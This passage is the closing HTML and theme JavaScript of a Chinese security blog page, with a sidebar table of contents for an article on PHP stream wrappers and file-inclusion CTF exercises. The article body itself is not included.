+<svg class="loading" style="vertical-align:middle;fill:currentColor;overflow:hidden;" viewBox="0 0 1024 1024" version="1.1" xmlns="http://www.w3.org/2000/svg" p-id="2709"><path d="M832 512c0-176-144-320-320-320V128c211.2 0 384 172.8 384 384h-64zM192 512c0 176 144 320 320 320v64C300.8 896 128 723.2 128 512h64z" p-id="2710"></path></svg>
+
+<div id="beaudar" repo="we11s/blog-comment" issue-term="pathname" theme="preferred-color-scheme" input-position="top" comment-order="desc" loading="true" branch="main"></div>
+
+    </section>
+  </div>
+
+
+
+<footer class="page-footer footnote"><hr><div class="text"><p>本站由 <a href="/">Wells</a> 使用 <a target="_blank" rel="noopener" href="https://github.com/xaoxuu/hexo-theme-stellar/tree/1.33.1">Stellar</a> 主题创建。<br>本博客所有文章除特别声明外，均采用 <a target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/">CC BY-NC-SA 4.0</a> 许可协议，转载请注明出处。</p>
+</div></footer>
+<div class="main-mask" onclick="sidebar.dismiss()"></div></div><aside class="l_right">
+<div class="widgets">
+
+
+
+<widget class="widget-wrapper toc" id="data-toc" collapse="false"><div class="widget-header dis-select"><span class="name">本文目录</span><a class="cap-action" onclick="sidebar.toggleTOC()" ><svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24"><path fill="none" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M10 6h11m-11 6h11m-11 6h11M4 6h1v4m-1 0h2m0 8H4c0-1 2-2 2-3s-1-1.5-2-1"/></svg></a></div><div class="widget-body"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%B8%B8%E8%A7%81%E5%8D%8F%E8%AE%AE%E4%B8%8E%E5%B0%81%E8%A3%85%E5%8D%8F%E8%AE%AE"><span class="toc-text">常见协议与封装协议</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#file"><span class="toc-text">file:&#x2F;&#x2F;</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#http"><span class="toc-text">http:&#x2F;&#x2F;</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#php"><span class="toc-text">php:&#x2F;&#x2F;</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#php-filter"><span class="toc-text">php:&#x2F;&#x2F;filter</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%B8%B8%E7%94%A8%E8%BF%87%E6%BB%A4%E5%99%A8"><span class="toc-text">常用过滤器</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E5%AD%97%E7%AC%A6%E4%B8%B2%E8%BF%87%E6%BB%A4%E5%99%A8"><span class="toc-text">字符串过滤器</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E8%BD%AC%E6%8D%A2%E8%BF%87%E6%BB%A4%E5%99%A8"><span class="toc-text">转换过滤器</span></a></li></ol></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#php-input"><span class="toc-text">php:&#x2F;&#x2F;input</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#zlib"><span class="toc-text">zlib:&#x2F;&#x2F;</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#phar"><span class="toc-text">phar:&#x2F;&#x2F;</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#data"><span class="toc-text">data:&#x2F;&#x2F;</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E4%BD%BF%E7%94%A8%E5%9C%BA%E6%99%AF"><span class="toc-text">使用场景</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#include%E5%92%8Crequire%E5%87%BD%E6%95%B0"><span class="toc-text">include和require函数</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#include-once%E5%92%8Crequire-once%E5%87%BD%E6%95%B0"><span class="toc-text">include_once和require_once函数</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#highlight-file-%E5%92%8Cshow-source"><span class="toc-text">highlight_file()和show_source()</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#readfile%E5%92%8Cfile-get-contents%E5%92%8Cfile"><span class="toc-text">readfile和file_get_contents和file</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#file-get-contents"><span class="toc-text">file_get_contents</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#readfile"><span class="toc-text">readfile</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#file-1"><span class="toc-text">file</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#file-put-contents"><span class="toc-text">file_put_contents</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#fopen"><span class="toc-text">fopen</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%AE%9E%E6%88%98"><span class="toc-text">实战</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#No-1-%E5%9C%9F%E8%B1%86%E5%93%A5%E7%BB%99%E7%9A%84%E9%A2%98%E7%9B%AE"><span class="toc-text">No.1 土豆哥给的题目</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#No-2-CTFHub-%E6%8A%80%E8%83%BD%E6%A0%91-RCE-%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB-%E8%BF%9C%E7%A8%8B%E5%8C%85%E5%90%AB"><span class="toc-text">No.2 CTFHub 技能树-RCE-文件包含-远程包含</span></a></li></ol></li></ol></div><div class="widget-footer"><a class="top" onclick="util.scrollTop()"><svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24"><!-- Icon from Solar by 480 Design - https://creativecommons.org/licenses/by/4.0/ --><g fill="none" stroke="currentColor" stroke-linecap="round" stroke-width="1.5"><path stroke-linejoin="round" d="m9 15.5l3-3l3 3m-6-4l3-3l3 3"/><path d="M7 3.338A9.95 9.95 0 0 1 12 2c5.523 0 10 4.477 10 10s-4.477 10-10 10S2 17.523 2 12c0-1.821.487-3.53 1.338-5"/></g></svg><span>回到顶部</span></a><a class="buttom" onclick="util.scrollComment()"><svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24"><!-- Icon from Solar by 480 Design - https://creativecommons.org/licenses/by/4.0/ --><path fill="none" stroke="currentColor" stroke-linecap="round" stroke-width="1.5" d="M8 10.5h8M8 14h5.5M17 3.338A9.95 9.95 0 0 0 12 2C6.477 2 2 6.477 2 12c0 1.6.376 3.112 1.043 4.453c.178.356.237.763.134 1.148l-.595 2.226a1.3 1.3 0 0 0 1.591 1.592l2.226-.596a1.63 1.63 0 0 1 1.149.133A9.96 9.96 0 0 0 12 22c5.523 0 10-4.477 10-10c0-1.821-.487-3.53-1.338-5"/></svg><span>参与讨论</span></a></div></widget>
+</div></aside><div class='float-panel'>
+  <button type='button' style='display:none' class='laptop-only rightbar-toggle mobile' onclick='sidebar.rightbar()'>
+    <svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24"><path fill="none" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M10 6h11m-11 6h11m-11 6h11M4 6h1v4m-1 0h2m0 8H4c0-1 2-2 2-3s-1-1.5-2-1"/></svg>
+  </button>
+  <button type='button' style='display:none' class='mobile-only leftbar-toggle mobile' onclick='sidebar.leftbar()'>
+    <svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24"><g fill="none" stroke="currentColor" stroke-width="1.5"><path d="M2 11c0-3.771 0-5.657 1.172-6.828C4.343 3 6.229 3 10 3h4c3.771 0 5.657 0 6.828 1.172C22 5.343 22 7.229 22 11v2c0 3.771 0 5.657-1.172 6.828C19.657 21 17.771 21 14 21h-4c-3.771 0-5.657 0-6.828-1.172C2 18.657 2 16.771 2 13z"/><path id="sep" stroke-linecap="round" d="M5.5 10h6m-5 4h4m4.5 7V3"/></g></svg>
+  </button>
+</div>
+</div><div class="scripts">
+
+
+<script type="text/javascript">
+  window.canonical = {"originalHost":null,"officialHosts":["localhost"],"encoded":""};
+  const ctx = {
+    date_suffix: {
+      just: `刚刚`,
+      min: `分钟前`,
+      hour: `小时前`,
+      day: `天前`,
+    },
+    root : `/`,
+    tag_plugins: {
+      chat: Object.assign({"api":"https://siteinfo.listentothewind.cn/api/v1"}),
+    }
+  };
+
+  // required plugins (only load if needs)
+  if (`local_search`) {
+    ctx.search = {};
+    ctx.search.service = `local_search`;
+    if (ctx.search.service == 'local_search') {
+      let service_obj = Object.assign({}, `{"field":"all","path":"/search.json","content":true,"skip_search":null,"sort":"-date"}`);
+      ctx.search[ctx.search.service] = service_obj;
+    }
+  }
+  const def = {
+    avatar: `https://gcore.jsdelivr.net/gh/cdn-x/placeholder@1.0.12/avatar/round/3442075.svg`,
+    cover: `https://gcore.jsdelivr.net/gh/cdn-x/placeholder@1.0.12/cover/76b86c0226ffd.svg`,
+    loading: `https://api.iconify.design/eos-icons:three-dots-loading.svg?color=%231cd0fd`,
+  };
+  const deps = {
+    jquery: `https://cdn.jsdelivr.net/npm/jquery@3.7.1/dist/jquery.min.js`,
+    marked: `https://cdn.jsdelivr.net/npm/marked@13.0.1/lib/marked.umd.min.js`,
+    lazyload: `/%5Bobject%20Object%5D`
+  }
+  
+
+</script>
+
+<script type="text/javascript">
+  
+  function RunItem() {
+    this.list = []; // 存放回调函数
+    this.start = () => {
+      for (var i = 0; i < this.list.length; i++) {
+        this.list[i].run();
+      }
+    };
+    this.push = (fn, name, setRequestAnimationFrame = true) => {
+      let myfn = fn
+      if (setRequestAnimationFrame) {
+        myfn = () => {
+          utils.requestAnimationFrame(fn)
+        }
+      }
+      var f = new Item(myfn, name);
+      this.list.push(f);
+    };
+    this.remove = (name) => {
+      for (let index = 0; index < this.list.length; index++) {
+        const e = this.list[index];
+        if (e.name == name) {
+          this.list.splice(index, 1);
+        }
+      }
+    }
+    // 构造一个可以run的对象
+    function Item(fn, name) {
+      // 函数名称
+      this.name = name || fn.name;
+      // run方法
+      this.run = () => {
+        try {
+          fn()
+        } catch (error) {
+          console.log(error);
+        }
+      };
+    }
+  }
+
+  const utils = {
+    // 懒加载 css https://github.com/filamentgroup/loadCSS
+    css: (href, before, media, attributes) => {
+      var doc = window.document;
+      var ss = doc.createElement("link");
+      var ref;
+      if (before) {
+        ref = before;
+      } else {
+        var refs = (doc.body || doc.getElementsByTagName("head")[0]).childNodes;
+        ref = refs[refs.length - 1];
+      }
+      var sheets = doc.styleSheets;
+      if (attributes) {
+        for (var attributeName in attributes) {
+          if (attributes.hasOwnProperty(attributeName)) {
+            ss.setAttribute(attributeName, attributes[attributeName]);
+          }
+        }
+      }
+      ss.rel = "stylesheet";
+      ss.href = href;
+      ss.media = "only x";
+      function ready(cb) {
+        if (doc.body) {
+          return cb();
+        }
+        setTimeout(function () {
+          ready(cb);
+        });
+      }
+      ready(function () {
+        ref.parentNode.insertBefore(ss, before ? ref : ref.nextSibling);
+      });
+      var onloadcssdefined = function (cb) {
+        var resolvedHref = ss.href;
+        var i = sheets.length;
+        while (i--) {
+          if (sheets[i].href === resolvedHref) {
+            return cb();
+          }
+        }
+        setTimeout(function () {
+          onloadcssdefined(cb);
+        });
+      };
+      function loadCB() {
+        if (ss.addEventListener) {
+          ss.removeEventListener("load", loadCB);
+        }
+        ss.media = media || "all";
+      }
+      if (ss.addEventListener) {
+        ss.addEventListener("load", loadCB);
+      }
+      ss.onloadcssdefined = onloadcssdefined;
+      onloadcssdefined(loadCB);
+      return ss;
+    },
+
+    js: (src, opt) => new Promise((resolve, reject) => {
+      var script = document.createElement('script');
+      if (src.startsWith('/')) {
+        src = ctx.root + src.substring(1);
+      }
+      script.src = src;
+      if (opt) {
+        for (let key of Object.keys(opt)) {
+          script[key] = opt[key]
+        }
+      } else {
+        // 默认异步，如果需要同步，第二个参数传入 {} 即可
+        script.async = true
+      }
+      script.onerror = reject
+      script.onload = script.onreadystatechange = function () {
+        const loadState = this.readyState
+        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+        script.onload = script.onreadystatechange = null
+        resolve()
+      }
+      document.head.appendChild(script)
+    }),
+
+    jq: (fn) => {
+      if (typeof jQuery === 'undefined') {
+        utils.js(deps.jquery).then(fn)
+      } else {
+        fn()
+      }
+    },
+
+    onLoading: (el) => {
+      if (el) {
+        $(el).append('<div class="loading-wrap"><svg xmlns="http://www.w3.org/2000/svg" width="2em" height="2em" preserveAspectRatio="xMidYMid meet" viewBox="0 0 24 24"><g fill="none" stroke="currentColor" stroke-linecap="round" stroke-width="2"><path stroke-dasharray="60" stroke-dashoffset="60" stroke-opacity=".3" d="M12 3C16.9706 3 21 7.02944 21 12C21 16.9706 16.9706 21 12 21C7.02944 21 3 16.9706 3 12C3 7.02944 7.02944 3 12 3Z"><animate fill="freeze" attributeName="stroke-dashoffset" dur="1.3s" values="60;0"/></path><path stroke-dasharray="15" stroke-dashoffset="15" d="M12 3C16.9706 3 21 7.02944 21 12"><animate fill="freeze" attributeName="stroke-dashoffset" dur="0.3s" values="15;0"/><animateTransform attributeName="transform" dur="1.5s" repeatCount="indefinite" type="rotate" values="0 12 12;360 12 12"/></path></g></svg></div>');
+      }
+    },
+    onLoadSuccess: (el) => {
+      if (el) {
+        $(el).find('.loading-wrap').remove();
+      }
+    },
+    onLoadFailure: (el) => {
+      if (el) {
+        $(el).find('.loading-wrap svg').remove();
+        $(el).find('.loading-wrap').append('<svg xmlns="http://www.w3.org/2000/svg" width="2em" height="2em" preserveAspectRatio="xMidYMid meet" viewBox="0 0 24 24"><g fill="none" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="2"><path stroke-dasharray="60" stroke-dashoffset="60" d="M12 3L21 20H3L12 3Z"><animate fill="freeze" attributeName="stroke-dashoffset" dur="0.5s" values="60;0"/></path><path stroke-dasharray="6" stroke-dashoffset="6" d="M12 10V14"><animate fill="freeze" attributeName="stroke-dashoffset" begin="0.6s" dur="0.2s" values="6;0"/></path></g><circle cx="12" cy="17" r="1" fill="currentColor" fill-opacity="0"><animate fill="freeze" attributeName="fill-opacity" begin="0.8s" dur="0.4s" values="0;1"/></circle></svg>');
+        $(el).find('.loading-wrap').addClass('error');
+      }
+    },
+    request: (el, url, callback, onFailure) => {
+      const maxRetry = 3;
+      let retryCount = 0;
+
+      return new Promise((resolve, reject) => {
+        const load = () => {
+          utils.onLoading?.(el);
+
+          let timedOut = false;
+          const timeout = setTimeout(() => {
+            timedOut = true;
+            console.warn('[request] 超时:', url);
+
+            if (++retryCount >= maxRetry) {
+              utils.onLoadFailure?.(el);
+              onFailure?.();
+              reject('请求超时');
+            } else {
+              setTimeout(load, 1000);
+            }
+          }, 5000);
+
+          fetch(url).then(resp => {
+            if (timedOut) return;
+            clearTimeout(timeout);
+
+            if (!resp.ok) throw new Error('响应失败');
+            return resp;
+          }).then(data => {
+            if (timedOut) return;
+            utils.onLoadSuccess?.(el);
+            callback(data);
+            resolve(data);
+          }).catch(err => {
+            clearTimeout(timeout);
+            console.warn('[request] 错误:', err);
+
+            if (++retryCount >= maxRetry) {
+              utils.onLoadFailure?.(el);
+              onFailure?.();
+              reject(err);
+            } else {
+              setTimeout(load, 1000);
+            }
+          });
+        };
+
+        load();
+      });
+    },
+    requestWithoutLoading: (url, options = {}, maxRetry = 2, timeout = 5000) => {
+      return new Promise((resolve, reject) => {
+        let retryCount = 0;
+
+        const tryRequest = () => {
+          let timedOut = false;
+          const timer = setTimeout(() => {
+            timedOut = true;
+            if (++retryCount > maxRetry) reject('timeout');
+            else tryRequest();
+          }, timeout);
+
+          fetch(url, options)
+            .then(resp => {
+              clearTimeout(timer);
+              if (!resp.ok) throw new Error('bad response');
+              resolve(resp);
+            })
+            .catch(err => {
+              clearTimeout(timer);
+              if (++retryCount > maxRetry) reject(err);
+              else setTimeout(tryRequest, 500);
+            });
+        };
+
+        tryRequest();
+      });
+    },
+    /********************** requestAnimationFrame ********************************/
+    // 1、requestAnimationFrame 会把每一帧中的所有 DOM 操作集中起来，在一次重绘或回流中就完成，并且重绘或回流的时间间隔紧紧跟随浏览器的刷新频率，一般来说，这个频率为每秒60帧。
+    // 2、在隐藏或不可见的元素中，requestAnimationFrame 将不会进行重绘或回流，这当然就意味着更少的的 cpu，gpu 和内存使用量。
+    requestAnimationFrame: (fn) => {
+      if (!window.requestAnimationFrame) {
+        window.requestAnimationFrame = window.requestAnimationFrame || window.mozRequestAnimationFrame || window.webkitRequestAnimationFrame;
+      }
+      window.requestAnimationFrame(fn)
+    },
+    dark: {},
+  };
+
+  // utils.dark.mode 当前模式 dark or light
+  // utils.dark.toggle() 暗黑模式触发器
+  // utils.dark.push(callBack[,"callBackName"]) 传入触发器回调函数
+  utils.dark.method = {
+    toggle: new RunItem(),
+  };
+  utils.dark = Object.assign(utils.dark, {
+    push: utils.dark.method.toggle.push,
+  });
+</script>
+<script>
+  const sidebar = {
+    leftbar: () => {
+      if (l_body) {
+        l_body.toggleAttribute('leftbar');
+        l_body.removeAttribute('rightbar');
+      }
+    },
+    rightbar: () => {
+      if (l_body) {
+        l_body.toggleAttribute('rightbar');
+        l_body.removeAttribute('leftbar');
+      }
+    },
+    dismiss: () => {
+      if (l_body) {
+        l_body.removeAttribute('leftbar');
+        l_body.removeAttribute('rightbar');
+      }
+    },
+    toggleTOC: () => {
+      document.querySelector('#data-toc').classList.toggle('collapse');
+    }
+  }
+</script>
+<script type="text/javascript">
+  (() => {
+    const tagSwitchers = document.querySelectorAll('.tag-subtree.parent-tag > a > .tag-switcher-wrapper')
+    for (const tagSwitcher of tagSwitchers) {
+      tagSwitcher.addEventListener('click', (e) => {
+        const parent = e.target.closest('.tag-subtree.parent-tag')
+        parent.classList.toggle('expanded')
+        e.preventDefault()
+      })
+    }
+
+    // Get active tag from query string, then activate it.
+    const urlParams = new URLSearchParams(window.location.search)
+    const activeTag = urlParams.get('tag')
+    if (activeTag) {
+      let tag = document.querySelector(`.tag-subtree[data-tag="${activeTag}"]`)
+      if (tag) {
+        tag.querySelector('a').classList.add('active')
+        
+        while (tag) {
+          tag.classList.add('expanded')
+          tag = tag.parentElement.closest('.tag-subtree.parent-tag')
+        }
+      }
+    }
+  })()
+</script>
+
+<script async src="https://gcore.jsdelivr.net/npm/vanilla-lazyload@19.1/dist/lazyload.min.js"></script>
+<script>
+  // https://www.npmjs.com/package/vanilla-lazyload
+  // Set the options globally
+  // to make LazyLoad self-initialize
+  window.lazyLoadOptions = {
+    elements_selector: ".lazy",
+    callback_loaded: (el) => {
+      el.classList.add('loaded');
+      const wrapper = el.closest('.lazy-box');
+      const icon = wrapper?.querySelector('.lazy-icon');
+      if (icon) icon.remove();
+    }
+  };
+  // Listen to the initialization event
+  // and get the instance of LazyLoad
+  window.addEventListener(
+    "LazyLoad::Initialized",
+    function (event) {
+      window.lazyLoadInstance = event.detail.instance;
+    },
+    false
+  );
+  document.addEventListener('DOMContentLoaded', function () {
+    window.lazyLoadInstance?.update();
+  });
+
+  window.wrapLazyloadImages = (container) => {
+    if (typeof container === 'string') {
+      container = document.querySelector(container);
+    }
+    if (!container) return;
+    
+    const images = container.querySelectorAll('img');
+    images.forEach((img) => {
+      if (img.classList.contains('lazy')) return;
+
+      const src = img.getAttribute('src');
+      if (!src) return;
+
+      const wrapper = document.createElement('div');
+      wrapper.className = 'lazy-box';
+
+      const newImg = img.cloneNode();
+      newImg.removeAttribute('src');
+      newImg.setAttribute('data-src', src);
+      newImg.classList.add('lazy');
+
+      const icon = document.createElement('div');
+      icon.className = 'lazy-icon';
+      if (def.loading) {
+        icon.style.backgroundImage = `url("${def.loading}")`;
+      }
+
+      wrapper.appendChild(newImg);
+      wrapper.appendChild(icon);
+
+      img.replaceWith(wrapper);
+    });
+
+    // 通知 LazyLoad 更新
+    if (window.lazyLoadInstance?.update) {
+      window.lazyLoadInstance.update();
+    }
+  }
+  
+</script>
+
+<!-- required -->
+<script src="/js/main.js?v=1.33.1" defer></script>
+
+<script type="text/javascript">
+  const applyTheme = (theme) => {
+    if (theme === 'auto') {
+      document.documentElement.removeAttribute('data-theme')
+    } else {
+      document.documentElement.setAttribute('data-theme', theme)
+    }
+
+    // applyThemeToGiscus(theme)
+  }
+
+  // FIXME: 这会导致无法使用 preferred_color_scheme 以外的主题
+  const applyThemeToGiscus = (theme) => {
+    // theme = theme === 'auto' ? 'preferred_color_scheme' : theme
+    const cmt = document.getElementById('giscus')
+    if (cmt) {
+      // This works before giscus load.
+      cmt.setAttribute('data-theme', theme)
+    }
+
+    const iframe = document.querySelector('#comments > section.giscus > iframe')
+    if (iframe) {
+      // This works after giscus loaded.
+      const src = iframe.src
+      const newSrc = src.replace(/theme=[\w]+/, `theme=${theme}`)
+      iframe.src = newSrc
+    }
+  }
+
+  const switchTheme = () => {
+    // light -> dark -> auto -> light -> ...
+    const currentTheme = document.documentElement.getAttribute('data-theme')
+    let newTheme;
+    switch (currentTheme) {
+      case 'light':
+        newTheme = 'dark'
+        break
+      case 'dark':
+        newTheme = 'auto'
+        break
+      default:
+        newTheme = 'light'
+    }
+    applyTheme(newTheme)
+    window.localStorage.setItem('Stellar.theme', newTheme)
+    utils.dark.mode = newTheme === 'auto' ? (window.matchMedia("(prefers-color-scheme: dark)").matches ? "dark" : "light") : newTheme;
+    utils.dark.method.toggle.start();
+
+    const messages = {
+      light: `切换到浅色模式`,
+      dark: `切换到深色模式`,
+      auto: `切换到跟随系统配色`,
+    }
+    hud?.toast?.(messages[newTheme])
+  }
+
+  (() => {
+    // Apply user's preferred theme, if any.
+    const theme = window.localStorage.getItem('Stellar.theme')
+    if (theme !== null) {
+      applyTheme(theme)
+    } else {
+      utils.dark.mode = window.matchMedia("(prefers-color-scheme: dark)").matches ? "dark" : "light";
+    }
+    utils.dark.method.toggle.start();
+  })()
+</script>
+
+
+<!-- optional -->
+
+  <script type="module">
+  const el = document.querySelector('#comments #beaudar');
+  util.viewportLazyload(el, load_beaudar, false);
+
+  function load_beaudar() {
+    if (!el) return;
+    try {
+      el.innerHTML = '';
+    } catch (error) {
+      console.error(error);
+    }
+    const script = document.createElement('script');
+    script.src = 'https://beaudar.lipk.org/client.js';
+    script.async = true;
+    for (const key of Object.keys(el.attributes)) {
+      const attr = el.attributes[key];
+      if (['class', 'id'].includes(attr.name) === false) {
+        script.setAttribute(attr.name, attr.value);
+      }
+    }
+    el.appendChild(script);
+  }
+</script>
+
+
+
+
+<script defer>
+  window.addEventListener('DOMContentLoaded', (event) => {
+    ctx.services = Object.assign({}, JSON.parse(`{"mdrender":{"js":"/js/services/mdrender.js"},"siteinfo":{"js":"/js/services/siteinfo.js","api":null},"ghinfo":{"js":"/js/services/ghinfo.js"},"rating":{"js":"/js/services/rating.js","api":"https://star-vote.xaox.cc/api/rating"},"vote":{"js":"/js/services/vote.js","api":"https://star-vote.xaox.cc/api/vote"},"sites":{"js":"/js/services/sites.js"},"friends":{"js":"/js/services/friends.js"},"friends_and_posts":{"js":"/js/services/friends_and_posts.js"},"timeline":{"js":"/js/services/timeline.js"},"fcircle":{"js":"/js/services/fcircle.js"},"weibo":{"js":"/js/services/weibo.js"},"memos":{"js":"/js/services/memos.js"},"voice":{"js":"/js/plugins/voice.js"},"video":{"js":"/js/plugins/video.js"},"download-file":{"js":"/js/plugins/download-file.js"},"twikoo":{"js":"/js/services/twikoo_latest_comment.js"},"waline":{"js":"/js/services/waline_latest_comment.js"},"artalk":{"js":"/js/services/artalk_latest_comment.js"},"giscus":{"js":"/js/services/giscus_latest_comment.js"},"contributors":{"edit_this_page":{"_posts/":null,"wiki/stellar/":"https://github.com/xaoxuu/hexo-theme-stellar-docs/blob/main/"},"js":"/js/services/contributors.js"}}`));
+    for (let id of Object.keys(ctx.services)) {
+      const js = ctx.services[id].js;
+      if (id == 'siteinfo') {
+        ctx.cardlinks = document.querySelectorAll('a.link-card[cardlink]');
+        if (ctx.cardlinks?.length > 0) {
+          utils.js(js, { defer: true }).then(function () {
+            setCardLink(ctx.cardlinks);
+          });
+        }
+      } else if (id == 'voice') {
+        ctx.voiceAudios = document.querySelectorAll('.voice>audio');
+        if (ctx.voiceAudios?.length > 0) {
+          utils.js(js, { defer: true }).then(function () {
+            createVoiceDom(ctx.voiceAudios);
+          });
+        }
+      } else if (id == 'video') {
+        ctx.videos = document.querySelectorAll('.video>video');
+        if (ctx.videos?.length > 0) {
+          utils.js(js, { defer: true }).then(function () {
+            videoEvents(ctx.videos);
+          });
+        }
+      } else if (id == 'download-file') {
+        ctx.files = document.querySelectorAll('.file');
+        if (ctx.files?.length > 0) {
+          utils.js(js, { defer: true }).then(function () {
+            downloadFileEvent(ctx.files);
+          });
+        }
+      } else {
+        const els = document.getElementsByClassName(`ds-${id}`);
+        if (els?.length > 0) {
+          utils.jq(() => {
+            if (id == 'timeline' || 'memos' || 'marked') {
+              utils.js(deps.marked).then(function () {
+                utils.js(js, { defer: true });
+              });
+            } else {
+              utils.js(js, { defer: true });
+            }
+          });
+        }
+      }
+    }
+
+    // chat iphone time
+    let phoneTimes = document.querySelectorAll('.chat .status-bar .time');
+
+    if (phoneTimes.length > 0) {
+      NowTime();
+      var date = new Date();
+      var sec = date.getSeconds();
+      var firstAdjustInterval = setInterval(firstAdjustTime, 1000 * (60 - sec));
+    }
+
+    function firstAdjustTime() {
+      NowTime();
+      clearInterval(firstAdjustInterval);
+      setInterval(NowTime, 1000 * 60);
+    }
+
+    function NowTime() {
+      for (let i = 0; i < phoneTimes.length; ++i) {
+        var timeSpan = phoneTimes[i];
+        var date = new Date();
+        var hour = date.getHours();
+        var min = date.getMinutes();
+        timeSpan.innerHTML = check(hour) + ":" + check(min);
+      }
+    };
+
+    function check(val) {
+      if (val < 10) {
+        return ("0" + val);
+      }
+      return (val);
+    }
+
+    // chat quote
+    const chat_quote_obverser = new IntersectionObserver((entries, observer) => {
+      entries.filter((entry) => { return entry.isIntersecting }).sort((a, b) => a.intersectionRect.y !== b.intersectionRect.y ? a.intersectionRect.y - b.intersectionRect.y : a.intersectionRect.x - b.intersectionRect.x).forEach((entry, index) => {
+          observer.unobserve(entry.target);
+          setTimeout(() => {
+            entry.target.classList.add('quote-blink');
+            setTimeout(() => {
+              entry.target.classList.remove('quote-blink');
+            }, 1000);
+          }, Math.max(100, 16) * (index + 1));
+        });
+    });
+
+    var chatQuotes = document.querySelectorAll(".chat .talk .quote");
+    chatQuotes.forEach((quote) => {
+      quote.addEventListener('click', function () {
+        var chatCellDom = document.getElementById("quote-" + quote.getAttribute("quotedCellTag"));
+        if (chatCellDom) {
+          var chatDiv = chatCellDom.parentElement;
+          var mid = chatDiv.clientHeight / 2;
+          var offsetTop = chatCellDom.offsetTop;
+          if (offsetTop > mid - chatCellDom.clientHeight / 2) {
+            chatDiv.scrollTo({
+              top: chatCellDom.offsetTop - mid + chatCellDom.clientHeight / 2,
+              behavior: "smooth"
+            });
+          } else {
+            chatDiv.scrollTo({
+              top: 0,
+              behavior: "smooth"
+            });
+          }
+          chat_quote_obverser.observe(chatCellDom);
+        }
+      });
+    });
+  });
+</script>
+
+<script>
+  window.addEventListener('DOMContentLoaded', (event) => {
+    ctx.search = {
+      path: `/search.json`,
+    }
+    utils.js('/js/search/local-search.js', { defer: true });
+  });
+</script><script>
+  window.FPConfig = {
+    delay: 0,
+    ignoreKeywords: [],
+    maxRPS: 5,
+    hoverDelay: 25
+  };
+</script>
+<script defer src="https://cdn.jsdelivr.net/npm/flying-pages@2/flying-pages.min.js"></script><script>
+  ctx.fancybox = {
+    selector: `.timenode p>img`,
+    css: `https://cdn.jsdelivr.net/npm/@fancyapps/ui@5.0/dist/fancybox/fancybox.css`,
+    js: `https://cdn.jsdelivr.net/npm/@fancyapps/ui@5.0/dist/fancybox/fancybox.umd.js`
+  };
+  var selector = '[data-fancybox]:not(.error), .with-fancybox .atk-content img:not([atk-emoticon])';
+  if (ctx.fancybox.selector) {
+    selector += `, ${ctx.fancybox.selector}`
+  }
+  var needFancybox = document.querySelectorAll(selector).length !== 0;
+  if (!needFancybox) {
+    const memos = document.getElementsByClassName('ds-memos');
+    if (memos != undefined && memos.length > 0) {
+      needFancybox = true;
+    }
+    const fancybox = document.getElementsByClassName('with-fancybox');
+    if (fancybox != undefined && fancybox.length > 0) {
+      needFancybox = true;
+    }
+  }
+  if (needFancybox) {
+    utils.css(ctx.fancybox.css);
+    utils.js(ctx.fancybox.js, { defer: true }).then(function () {
+      Fancybox.bind(selector, {
+        hideScrollbar: false,
+        Thumbs: {
+          autoStart: false,
+        },
+        caption: (fancybox, slide) => {
+          return slide.triggerEl.alt || slide.triggerEl.dataset.caption || null
+        }
+      });
+    })
+  }
+</script>
+<script>
+  window.addEventListener('DOMContentLoaded', (event) => {
+    const swiper_api = document.getElementById('swiper-api');
+    if (swiper_api != undefined) {
+      utils.css(`https://unpkg.com/swiper@10.3.1/swiper-bundle.min.css`);
+      utils.js(`https://unpkg.com/swiper@10.3.1/swiper-bundle.min.js`, { defer: true }).then(function () {
+        const effect = swiper_api.getAttribute('effect') || '';
+        var swiper = new Swiper('.swiper#swiper-api', {
+          slidesPerView: 'auto',
+          spaceBetween: 8,
+          centeredSlides: true,
+          effect: effect,
+          rewind: true,
+          pagination: {
+            el: '.swiper-pagination',
+            clickable: true,
+          },
+          navigation: {
+            nextEl: '.swiper-button-next',
+            prevEl: '.swiper-button-prev',
+          },
+        });
+      })
+    }
+  });
+</script>
+<script>
+  document.addEventListener('DOMContentLoaded', function () {
+    window.codeElements = document.querySelectorAll('.code');
+    if (window.codeElements.length > 0) {
+      ctx.copycode = {
+        default_text: `Copy`,
+        success_text: `Copied`,
